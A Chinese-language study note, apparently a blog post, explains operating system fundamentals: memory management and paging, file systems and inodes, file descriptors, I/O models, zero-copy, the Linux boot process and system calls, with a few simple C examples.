地址空间与地址类型逻辑地址（虚拟地址）逻辑地址是由程序生成的地址，也叫虚拟地址。在程序中访问内存时，使用的就是逻辑地址。
物理地址物理地址是真正被映射到内存芯片上的地址，由硬件识别。操作系统通过内存管理单元（MMU）将逻辑地址转换成物理地址。
地址空间
逻辑地址空间：进程能看到的内存范围。
物理地址空间：实际硬件可用的内存范围。

每个进程有独立的逻辑地址空间，操作系统通过地址转换机制将其映射到共享的物理内存上。

分段（Segmentation）分段是一种将逻辑地址空间划分为多个“逻辑单元”的方法，比如代码段、数据段、堆、栈等。

每段具有独立的基址和长度。
程序更容易实现模块化管理。
缺点是段长不固定，容易产生外部碎片。

分段常用于早期操作系统或嵌入式系统，在现代系统中通常结合分页一起使用。


分页（Paging）分页是将物理内存和逻辑内存都划分成等大小的固定块，分别叫做：

页（Page）：逻辑内存单位
帧（Frame）：物理内存单位

操作系统维护一个页表（Page Table），用于将每个页映射到对应的帧，解决了分段带来的外部碎片问题。

每个进程都有自己的页表
地址转换过程由 MMU 自动完成

地址转换过程逻辑地址 &#x3D; 页号 + 页内偏移查页表得到帧号，组合成物理地址。

虚拟内存（Virtual Memory）虚拟内存是操作系统通过分页机制提供的一种内存扩展技术。即使物理内存不足，也可以通过将部分内存页暂存到磁盘（称为交换空间或 Swap）来继续执行程序。

提供了比实际物理内存更大的地址空间
支持按需调页，程序启动时不需要全部加载到内存
支持内存共享和内存保护机制


页面置换算法当内存不足，必须将一部分内存页换出磁盘，空出空间加载新页，这称为页面置换。操作系统使用页面置换算法来决定“淘汰哪一页”。
常见算法包括：
FIFO（先进先出）最早进入内存的页最先被换出，简单但效率不佳，容易出现 Belady 异常（缓存更大反而更差）。
LRU（最近最少使用）淘汰最近最少使用的页，基于访问历史，命中率高，但实现复杂，通常需要硬件支持或近似算法。
Clock（时钟算法）一种 LRU 的近似实现，使用一个“指针”遍历页表，查看是否被访问过，没访问的就换出。

内存分配策略操作系统在分配内存块时，也使用了不同的策略：

首次适配（First Fit）：从头开始找第一个够用的空闲块
最佳适配（Best Fit）：找最接近所需大小的空闲块，减少碎片
最差适配（Worst Fit）：找最大的空闲块，预留更多剩余空间

这些策略都面临一个问题：内存碎片，包括：

外部碎片：空闲块分布零散，总空间够但连续不够
内部碎片：分配的块比实际需求大，造成浪费

分页能很好地解决这两个问题，但会带来页表维护开销。

多级页表与快表（TLB）在分页系统中，页表过大时会引起访问效率下降。为了解决这个问题，操作系统引入了：

多级页表：将页表本身分页，分层管理，节省内存空间
TLB（Translation Lookaside Buffer）：一种缓存页表项的高速缓冲区，提升地址转换速度

如果页表命中 TLB，地址转换非常快；如果未命中，就需要多次内存访问。

内存保护与共享现代操作系统通过 MMU 提供内存保护机制：

每个进程只能访问自己的地址空间
通过设置页表项中的访问权限，实现读写保护
共享内存（如动态链接库）可以被多个进程映射到相同的物理帧上，提升内存利用率


典型案例：Linux 内存结构在 Linux 中，每个进程的虚拟地址空间大致如下：
高地址---------------------内核空间---------------------用户堆栈（Stack）共享库（.so）堆（Heap）未初始化数据段（.bss）初始化数据段（.data）代码段（.text）---------------------低地址

堆向上增长，栈向下增长，这样可以更好地利用地址空间。

文件系统文件系统的作用文件系统是操作系统中负责管理和存储数据的子系统，其核心目标是为用户提供一种抽象、统一、安全、高效的数据访问方式。
通过文件系统，用户可以方便地创建、读取、修改、删除文件和目录，而无需关心底层磁盘的组织方式。

文件的逻辑结构从操作系统角度看，文件是逻辑上的字节序列，可以是文本、图片、程序、数据库文件等。文件通常包括以下信息：

文件数据：实际内容
元数据（Metadata）：描述文件的属性，如文件名、大小、创建时间、权限等


文件目录组织为了便于管理大量文件，操作系统使用目录结构进行层级分类。常见目录结构包括：
单层目录结构所有文件存储在一个目录下，简单但混乱，不适合多用户系统。
二级目录结构每个用户一个独立目录，解决了命名冲突，但目录层级仍然不够丰富。
树形目录结构（现代系统通用）支持多层嵌套子目录，灵活且可扩展。路径分为：

绝对路径：从根目录 / 开始，如 /home/user***/docs
相对路径：基于当前目录，如 ../images


inode（索引节点）Linux 等类 Unix 系统中，每个文件都有一个唯一的索引节点（inode），用于记录文件的元数据和磁盘位置。
inode 包含以下信息：

文件类型（普通文件、目录、符号链接等）
文件权限（rwx）
所有者 UID、组 GID
创建、访问、修改时间
文件大小
指向数据块的指针

文件名和 inode 是分离的。多个文件名可以指向同一个 inode（硬链接）。

文件的访问权限Unix 系统使用三类用户 + 三种权限的模型：

用户类型：
所有者（User）
所在组（Group）
其他用户（Others）


权限类型：
读（r）：查看文件内容或目录列表
写（w）：修改文件内容或目录结构
执行（x）：运行文件或进入目录



例如权限串 -rw-r--r-- 表示一个普通文件，拥有者可读写，组和其他用户只读。

磁盘空间的分配方式文件的数据被存储在磁盘块（block）中，磁盘块的分配方式会影响读写性能和碎片率：
连续分配文件占用连续的磁盘块，读写性能高，但不利于文件扩展，容易产生外部碎片。
链式分配每个磁盘块中记录下一个块的地址，文件可任意扩展，但随机访问性能差。
索引分配每个文件有一个索引块，记录所有数据块的地址，灵活且易于管理，是现代文件系统的主流方式。

常见文件系统类型FAT（File Allocation Table）
早期 Windows 使用，简单但易碎片化
无权限管理机制，适合 U 盘、存储卡等移动设备

NTFS（Windows 默认）
支持权限控制、日志、压缩、加密等特性
稳定性和扩展性好，适用于大型存储系统

ext 系列（Linux）
ext3：支持日志机制
ext4：支持大文件、文件系统检查更快，广泛应用于 Linux 发行版

XFS、ZFS、Btrfs 等
更现代的文件系统，支持快照、复制、自动修复等高级特性，适用于云计算和企业环境


缓存与写入机制操作系统并不会每次写入都直接同步到磁盘，而是使用缓存机制提升性能：

页缓存（Page Cache）：内存中保存文件内容
写回机制（Write-back）：延迟写入，提高效率
写通机制（Write-through）：写操作同步写入磁盘，更安全但性能差

可以使用 fsync() 或 sync 命令强制刷新缓存。

符号链接与硬链接硬链接（Hard Link）
多个文件名指向同一个 inode
删除任意一个不会影响其他链接
不能跨文件系统或对目录使用

符号链接（Symbolic Link）
类似快捷方式，指向目标文件路径
本质是一个独立文件
可以跨文件系统使用


文件系统的挂载与卸载在 Unix&#x2F;Linux 中，所有设备上的文件系统都被“挂载”到主目录树上。

使用 mount 命令将设备挂载到某个目录
使用 umount 卸载
/etc/fstab 可配置开机自动挂载项

挂载是将不同存储介质的内容统一整合到单一的目录结构中。

文件描述符文件描述符（File Descriptor，FD） 是一个相对抽象的概念，但它在操作系统（尤其是 Linux&#x2F;Unix 系统）中起着至关重要的作用。简而言之，文件描述符是一个整数，用于标识一个打开的文件或 I&#x2F;O 资源（如套接字、管道等）。
文件描述符的基本概念在 Linux&#x2F;Unix 系统中，当一个进程打开一个文件或设备时，操作系统会分配一个文件描述符来引用该文件或设备。进程通过文件描述符与文件或设备进行交互，而不是直接操作文件名或设备。
可以将文件描述符看作是一个“索引”，它指向操作系统内核中的一个数据结构，该数据结构描述了打开文件的相关信息，如文件的位置、文件的读写权限、文件的类型等。
文件描述符的范围
标准输入（stdin）：文件描述符 0
标准输出（stdout）：文件描述符 1
标准错误（stderr）：文件描述符 2

这些是系统启动时就自动打开的文件描述符，通常用来处理命令行输入输出。
对于用户程序打开的文件或设备，操作系统会从 3 开始分配文件描述符。每打开一个文件或 I&#x2F;O 资源，操作系统会返回一个新的文件描述符。
文件描述符与文件操作文件描述符是进程与文件、套接字等 I&#x2F;O 资源进行交互的 接口。通过文件描述符，进程可以执行各种操作，如读取、写入、关闭等。
示例
打开文件：

int fd = open(&quot;file.txt&quot;, O_RDONLY);

这里，open() 系统调用返回一个文件描述符 fd，它代表了 &quot;file.txt&quot; 这个文件。

读写文件：

char buffer[100];int bytes_read = read(fd, buffer, 100);

read() 系统调用使用文件描述符 fd 来读取文件内容。

关闭文件：

close(fd);

close() 系统调用用来关闭文件描述符 fd，释放内核资源。
文件描述符的底层实现操作系统内部使用文件描述符来管理文件。每个文件描述符对应一个 文件表项（file table entry），它包含了以下信息：

文件的偏移量（即文件指针的位置）
文件的访问权限
当前打开的文件的状态（如是否已打开）

这些信息存在于操作系统内核的内存中。当进程使用文件描述符进行操作时，内核会根据该描述符查找对应的文件表项，从而完成对文件的读写、关闭等操作。
文件描述符的用途文件描述符不仅仅用于文件，还用于其他类型的 I&#x2F;O 资源，如：

网络套接字（Socket）：用于处理网络通信。
管道（Pipe）：用于进程间通信（IPC）。
设备文件：如 /dev/null、/dev/sda 等，表示硬件设备。

因此，文件描述符是操作系统实现 I&#x2F;O 操作的一个 抽象接口，它使得程序可以通过统一的方式访问不同的资源。
示例：标准输入输出的使用在 C 语言中，你可以通过文件描述符直接进行标准输入输出操作：
#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() &#123;    char buf[100];    int bytes_read = read(0, buf, sizeof(buf));  // 从标准输入读取数据，文件描述符 0 是标准输入    write(1, buf, bytes_read);  // 向标准输出写入数据，文件描述符 1 是标准输出    return 0;&#125;

在这个例子中，0 和 1 就是标准输入和标准输出的文件描述符，read() 和 write() 系统调用通过这些文件描述符与 I&#x2F;O 设备交互。

总结
文件描述符 是操作系统分配给进程的整数，用于表示已打开的文件、套接字、管道等 I&#x2F;O 资源。
它是进程与外部资源进行交互的 抽象接口，允许操作系统统一管理所有类型的 I&#x2F;O 操作。
文件描述符通常从 3 开始，标准输入、标准输出、标准错误分别是 0、1、2。
通过文件描述符，程序可以执行如读取、写入、关闭等操作，而无需直接处理底层的设备细节。

虽然文件描述符的概念抽象，但它是操作系统中 I&#x2F;O 操作的基础，理解它有助于更好地掌握系统资源的管理。

设备管理与I&#x2F;O系统设备管理的目标操作系统中的设备管理负责协调各种输入输出设备的访问和调度，包括磁盘、键盘、显示器、网卡、打印机等。
主要目标包括：

统一接口：为应用程序屏蔽硬件差异
资源共享：协调多个进程访问同一设备
并发控制：避免冲突和竞争
性能优化：提升设备利用率和响应速度


设备的分类按功能和控制方式，设备可以分为以下几类：
按功能划分
块设备（Block Devices）：以固定大小块为单位读写，如硬盘、SSD、光驱
字符设备（Character Devices）：按字节流方式读写，如串口、键盘、鼠标
网络设备（Network Devices）：进行数据包发送和接收，如网卡

按访问方式划分
随机访问设备：如磁盘，支持跳转到任意位置读写
顺序访问设备：如磁带，必须按顺序读取


驱动程序的作用设备驱动程序是设备和操作系统之间的“翻译官”，将统一的系统调用接口转换成设备控制指令。
驱动程序通常以模块形式加载到内核中，具备以下特性：

面向特定硬件编写，强依赖设备细节
提供初始化、读写、中断处理等功能
支持热插拔、错误恢复、功耗管理等高级功能

现代操作系统使用 **设备树（Device Tree）**或 ACPI 表进行设备发现和初始化。

I&#x2F;O 操作的基本流程一次典型的 I&#x2F;O 操作大致流程如下：

用户调用标准库函数（如 read()、write()）
操作系统发出系统调用，进入内核
驱动程序控制设备开始传输
设备完成操作后发送中断信号
操作系统唤醒等待进程，返回数据


I&#x2F;O 模型操作系统提供多种 I&#x2F;O 模型，用于平衡“等待时间”和“并发能力”。
阻塞 I&#x2F;O调用方发出 I&#x2F;O 请求后，阻塞等待数据返回，适合简单场景，但性能不高。
非阻塞 I&#x2F;O立即返回，如果没有数据可读，则返回错误码。适合轮询模型。
多路复用 I&#x2F;O（select&#x2F;poll&#x2F;epoll）单个线程监控多个 I&#x2F;O 事件，适合高并发网络服务器。

select：支持有限文件描述符，性能一般
poll：不限数量，但每次都要遍历
epoll：事件驱动机制，性能优越（Linux 特有）

异步 I&#x2F;O（AIO）I&#x2F;O 调用立即返回，操作系统后台完成数据传输后通知用户程序，真正意义上的“非阻塞”。

实现复杂，但极大减少线程上下文切换
在高性能服务器和数据库中常见


中断机制与 DMA中断机制设备完成操作后，通过发送中断请求（IRQ）通知 CPU，无需程序主动等待。

硬件中断：设备主动发起
软件中断：程序触发，如 int 0x80 系统调用

中断处理程序运行在内核态，必须快速响应并尽快返回。
DMA（Direct Memory Access）DMA 控制器允许设备绕过 CPU 直接访问内存，极大提高 I&#x2F;O 效率。

典型应用：磁盘读写、大规模数据传输
CPU 只需发出命令，数据搬运由 DMA 完成


缓冲区与缓存机制I&#x2F;O 操作通常通过缓冲区实现数据的批量传输，减少频繁调用和上下文切换：

用户缓冲区：由应用程序分配，如读取文件时的 buffer
内核缓冲区：系统内部缓存区，如页缓存、IO 缓冲

Linux 提供如下几种常见缓存机制：

页缓存（Page Cache）：文件内容缓存，提高读写性能
目录项缓存（dentry cache）：目录路径缓存，提升文件系统效率
inode 缓存：保存文件 inode 信息，避免重复读盘


I&#x2F;O 调度算法当多个进程同时请求磁盘 I&#x2F;O 时，操作系统通过调度算法优化执行顺序：

FCFS（先来先服务）：简单但效率低
SSTF（最短寻道时间优先）：优先处理距离当前磁头最近的请求
SCAN（电梯算法）：磁头像电梯一样来回移动处理请求
CFQ（完全公平队列）：为每个进程分配时间片，保持公平性（Linux 默认）


设备文件与 &#x2F;dev 目录Linux 中设备被抽象为文件，统一存储在 /dev 目录中。

每个设备文件对应一个驱动和设备实例
使用主设备号（major）标识驱动程序
使用次设备号（minor）标识设备编号

例如：
/dev/sda      # 第一块磁盘/dev/tty0     # 第一个终端/dev/null     # 空设备，丢弃写入数据


零拷贝零拷贝 指的是在数据传输过程中，尽量避免 CPU 进行多次内存拷贝操作，从而提升 I&#x2F;O 性能，降低 CPU 负载，尤其适用于高性能网络服务和大文件传输场景。
传统的数据传输方式在用户态和内核态之间涉及多次数据复制，而零拷贝通过各种机制尽量避免这些不必要的拷贝。

传统 I&#x2F;O 的拷贝过程（以发送文件为例）以一个应用程序发送文件数据到网络为例，传统流程大概如下：

磁盘上的文件内容通过 DMA 拷贝到内核缓冲区（Page Cache）
操作系统通过 read() 将数据从内核缓冲区拷贝到用户缓冲区（用户态）
应用程序调用 send()，再把用户缓冲区数据拷贝回内核的 socket 缓冲区
最后，数据通过网卡 DMA 发送出去

这整个过程涉及两次用户态和内核态之间的内存拷贝，非常耗费 CPU 和内存带宽。

零拷贝是怎么做的为了优化这类过程，现代操作系统（尤其是 Linux）支持一系列“零拷贝”技术主要思想是消除用户态和内核态之间的数据拷贝，从本质上说，零拷贝的优化目标是：

避免用户态 ↔ 内核态的数据拷贝
利用 DMA（Direct Memory Access）进行磁盘或网卡直接读写
重用页缓存或内存映射等机制，减少数据搬运

常见方式有：
sendfile() 系统调用这是 Linux 最常用的零拷贝接口，专门用来将一个文件“直接发送”到网络套接字。
sendfile(out_fd, in_fd, NULL, len);


内核内部直接将磁盘数据从 Page Cache 映射到 socket 缓冲区
避免用户态中间缓冲，完全不经过用户空间

实现中仍可能使用 DMA 和 page remapping 等方式来减少复制次数。
mmap() + write()
使用 mmap() 将文件直接映射到进程地址空间
不显式复制数据，直接通过地址映射访问数据
可用于共享内存或文件映射，也算是一种“用户空间零拷贝”

不过这种方式仍可能涉及写入时的额外 copy，不如 sendfile() 更彻底。
splice() &#x2F; tee() &#x2F; vmsplice()这是 Linux 提供的更底层的零拷贝接口，用于在文件描述符之间转移数据：

splice()：把数据从一个文件描述符“管道”到另一个，不经用户态
tee()：复制管道内容，不拷贝数据
vmsplice()：把用户缓冲区直接插入到管道中

这类接口配合管道&#x2F;套接字使用，可以实现极高性能的数据搬运（比如视频转发服务器）。

系统启动流程与内核机制系统启动的整体流程概览从按下电源按钮开始，到桌面或命令行界面出现，操作系统经历了以下关键阶段：

固件初始化（BIOS 或 UEFI）
引导加载器（Bootloader）启动
内核加载与初始化
用户空间初始化（init 系统）
系统服务启动，进入用户交互界面


固件初始化（BIOS &#x2F; UEFI）当电源接通后，主板上的 BIOS（老式）或 UEFI（现代）固件首先运行。

负责进行 POST（Power-On Self Test），检查内存、CPU、硬盘等是否正常
枚举设备，构建硬件环境信息
查找并加载引导设备（硬盘、U 盘等）上的引导加载器程序

UEFI 是 BIOS 的升级版，支持图形界面、GPT 分区、网络引导等高级功能。

引导加载器（Bootloader）引导加载器是磁盘上最先运行的操作系统组件，负责将内核加载到内存中，并交出控制权。
常见引导程序包括：

GRUB（GRand Unified Bootloader）：最常用的 Linux 启动器
LILO：早期的引导程序，已逐步被淘汰
Windows Boot Manager：Windows 系统的启动器

GRUB 的典型工作流程：

加载自身（位于磁盘 MBR 或 EFI 分区）
显示操作系统菜单（多系统引导）
加载内核镜像（如 /boot/vmlinuz）到内存
加载 initrd&#x2F;initramfs 初始内存盘
跳转到内核入口地址开始执行


内核初始化内核接手之后，开始执行一系列底层初始化动作：

检测和初始化 CPU、内存、I&#x2F;O 设备
建立中断向量表、内核页表、内存管理结构
启动内核线程，如 kthreadd、ksoftirqd、kworker 等
挂载根文件系统（从 initramfs 解压或磁盘中挂载 /）
执行第一个用户态进程：/sbin/init（或 systemd）

这一步之后，内核正式进入“运行态”，并开始管理整个系统。

用户空间初始化（init 进程）init 进程是用户空间的第一个进程，其 PID 恒为 1，是所有用户进程的祖先。
目前主流的 init 系统有：

System V init：早期采用，使用脚本启动服务，串行启动，效率不高
Upstart：Ubuntu 曾用，事件驱动模型
systemd：现代 Linux 系统主流，支持并行启动、服务依赖管理、日志记录（journald）等功能

systemd 会根据配置文件：

启动目标单元（target，如 graphical.target）
启动后台服务（如 network、dbus、sshd）
启动登录界面（TTY、GDM、LightDM 等）

最终进入用户交互状态。

用户态与内核态切换操作系统运行在两个权限级别：

用户态（User Mode）：应用程序运行的环境，权限受限
内核态（Kernel Mode）：内核代码运行环境，权限最高

从用户态进入内核态的三种方式：

系统调用（syscall）：如 read()、fork()，用户显式请求操作系统服务
中断（interrupt）：如硬件设备完成任务后发出的信号
异常（exception）：如除以 0、访问非法内存等

内核态执行完毕后，必须安全返回用户态，恢复之前的上下文信息。

系统调用机制系统调用是用户程序访问操作系统核心服务的唯一合法入口。
流程如下：

用户程序调用 C 库函数（如 open()）
C 库使用 syscall 指令切入内核态
内核根据调用号（Syscall Number）执行对应的内核服务
执行完毕后切回用户态，返回结果

Linux 使用软中断（int 0x80）或 sysenter/syscall 指令进行系统调用，效率较高。

内核模块与热插拔机制内核为提高灵活性，将部分功能设计成可加载模块（.ko 文件），如文件系统、设备驱动等。

使用 insmod 加载模块，rmmod 卸载模块
使用 modprobe 管理依赖关系
使用 lsmod 查看当前已加载模块

模块机制支持设备热插拔、内核调试和按需加载。

内核日志与调试Linux 提供多种内核日志和调试工具：

dmesg：查看启动日志和驱动信息
/proc 文件系统：以文件方式提供内核状态信息（如 /proc/cpuinfo）
strace：跟踪进程的系统调用
perf：分析性能瓶颈
gdb + qemu：进行内核级调试


]]></content>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
</search>
